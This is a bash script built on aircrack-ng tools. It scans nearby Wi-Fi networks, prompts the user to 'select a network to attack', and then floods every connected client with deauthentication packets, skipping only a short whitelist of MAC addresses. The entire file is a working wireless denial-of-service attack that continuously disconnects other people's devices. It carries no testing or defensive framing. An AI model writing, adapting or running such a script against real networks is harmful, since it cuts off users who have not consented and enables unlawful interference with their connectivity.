#!/bin/bash
echo 'Your network interface name?'
read interface
# # airmon-ng start $interface
# # airodump-ng $interface

ud="users-01.csv"

if [ -e "$ud" ]; then
  rm "$ud"
fi
sudo xterm -title "Deauth scanner" -e airodump-ng -w out --output-format csv $interface


options=()

while read -r line; do
    options+=("$line")
done < <(awk -F "," 'NR>2 && !/Station MAC/ {print $1, $14} /Station MAC/ {exit}' out-01.csv)

PS3="Select a network to attack: "
select choice in "${options[@]}"; do
    if [ -n "$choice" ]; then
        bande=$choice
        break
    else
        echo "Invalid option. Please try again."
    fi
done
bssid=$(echo "$bande" | awk '{print $1}')
# echo $bssid
rm out-01.csv



WHITELIST=("6A:04:8E:78:30:35" "4A:05:8E:78:30:32")





xterm -title "Users monitor" -e  airodump-ng --bssid "$bssid" -w users --output-format csv $interface &

sleep 2



while true; do
    macs=($(awk -F "," 'NR>5 {print $1}' users-01.csv))
    for mac in "${macs[@]}"; do
        skip=0
        for white in "${WHITELIST[@]}"; do
            if [ "$mac" == "$white" ]; then
                skip=1
                break
            fi
        done
        [ "$skip" -eq 1 ] && continue

        xterm -title "Aireplay-ng for $mac" -e \
            iwconfig wlan0 channel 6 && \
            sudo aireplay-ng --deauth 100000 -a "$bssid" -c "$mac" "$interface" &
    done
    sleep 5  # Adjust the sleep duration based on your requirements
done
